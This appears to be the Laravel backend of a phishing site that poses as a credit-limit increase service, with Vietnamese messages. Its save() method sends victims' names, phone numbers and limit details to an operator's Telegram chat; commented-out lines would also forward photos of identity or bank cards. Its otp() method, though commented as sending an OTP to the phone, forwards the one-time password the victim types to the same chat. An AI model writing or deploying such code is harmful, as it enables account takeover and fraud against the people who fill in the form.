<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Customer;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Log;

class CustomerController extends Controller
{
    public function save(Request $request)
    {
        $request->validate([
            'name' => 'required',
            'phone' => 'required',
            'limit_now' => 'required',
            'limit_total' => 'required',
            'limit_increase' => 'required',
            'imageIds' => 'required|array',
        ], [
            'name.required' => 'Vui lòng nhập tên khách hàng',
            'phone.required' => 'Vui lòng nhập số điện thoại',
            'limit_now.required' => 'Vui lòng nhập giới hạn hiện tại',
            'limit_total.required' => 'Vui lòng nhập giới hạn tối đa',
            'limit_increase.required' => 'Vui lòng nhập giới hạn tăng',
            'imageIds.required' => 'Vui lòng chọn ảnh',
            'imageIds.array' => 'Ảnh không đúng định dạng',
        ]);

        $mattruoc_name = $request->imageIds[0];
        $matsau_name = $request->imageIds[1];
        $mattruoc_card_name = $request->imageIds[2];
        $matsau_card_name = $request->imageIds[3];

        // send html
        $message = " <b>Có khách hàng mới:</b> \n";
        $message .= " <b>Tên:</b> " . $request->name . "\n";
        $message .= " <b>Số điện thoại:</b> " . $request->phone . "\n";
        $message .= " <b>Giới hạn hiện tại:</b> " . $request->limit_now . "\n";
        $message .= " <b>Giới hạn tối đa:</b> " . $request->limit_total . "\n";
        $message .= " <b>Giới hạn tăng:</b> " . $request->limit_increase . "\n";
        // ảnh mặt trước
        // $message .= " <b>Ảnh mặt trước:</b> " . "<a href='" . asset('storage/' . $mattruoc_name) . "'>" . asset('storage/' . $mattruoc_name) . "</a>" . "\r\n";

        // // ảnh mặt sau

        // $message .= " <b>Ảnh mặt sau:</b> " . "<a href='" . asset('storage/' . $matsau_name) . "'>" . asset('storage/' . $matsau_name) . "</a>" . "\r\n";

        // // ảnh mặt trước thẻ

        // $message .= " <b>Ảnh mặt trước thẻ:</b> " . "<a href='" . asset('storage/' . $mattruoc_card_name) . "'>" . asset('storage/' . $mattruoc_card_name) . "</a>" . "\r\n";


        $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendMessage?chat_id=" . env('TELEGRAM_CHAT_ID') . "&text=" . $message . "&parse_mode=HTML";

        Artisan::call('app:send', ['url' => $url]);

        // $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendPhoto?chat_id=" . env('TELEGRAM_CHAT_ID') . "&photo=" . asset('storage/' . $mattruoc_name) . "&caption=Ảnh mặt trước";

        // Artisan::call(
        //     'app:send',
        //     ['url' => $url]
        // );


        // $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendPhoto?chat_id=" . env('TELEGRAM_CHAT_ID') . "&photo=" . asset('storage/' . $matsau_name) . "&caption=Ảnh mặt sau";

        // Artisan::call('app:send', ['url' => $url]);


        // $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendPhoto?chat_id=" . env('TELEGRAM_CHAT_ID') . "&photo=" . asset('storage/' . $mattruoc_card_name) . "&caption=Ảnh mặt trước thẻ";

        // Artisan::call('app:send', ['url' => $url]);


        // $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendPhoto?chat_id=" . env('TELEGRAM_CHAT_ID') . "&photo=" . asset('storage/' . $matsau_card_name) . "&caption=Ảnh mặt sau thẻ";

        // Artisan::call('app:send', ['url' => $url]);

        return response()->json([
            'message' => 'Thêm khách hàng thành công',
            'status' => 'success'
        ]);
    }
    public function postImage($url, $postContent)
    {

        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $postContent);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_HTTPHEADER, ['Content-Type: multipart/form-data']);
        $result = curl_exec($curl);
        curl_close($curl);
        return $result;
    }

    public function otp(Request $request)
    {
        $request->validate([
            'otp' => 'required',
        ], [
            'otp.required' => 'Vui lòng nhập số điện thoại',
        ]);

        $otp =  $request->otp;

        // send otp to phone
        $message = "Mã OTP là: " . $otp;
        $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendMessage?chat_id=" . env('TELEGRAM_CHAT_ID') . "&text=" . $message;

        file_get_contents($url);

        return response()->json([
            'message' => 'Mã OTP đã được gửi',
            'otp' => $otp,
            'status' => 'success'
        ]);
    }

    public function upload(Request $request)
    {
        $request->validate([
            'image' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:2048',
        ], [
            'image.required' => 'Vui lòng chọn ảnh',
            'image.image' => 'Ảnh không đúng định dạng',
            'image.mimes' => 'Ảnh không đúng định dạng',
            'image.max' => 'Ảnh không quá 2MB',
        ]);

        $image = $request->file('image');
        $image_name = 'image-' . time() . '.' . $image->extension();
        $image->storeAs('public', $image_name);

        return response()->json([
            'message' => 'Upload ảnh thành công',
            'imageUrl' => asset('storage/' . $image_name),
            'status' => 'success'
        ]);
    }
}
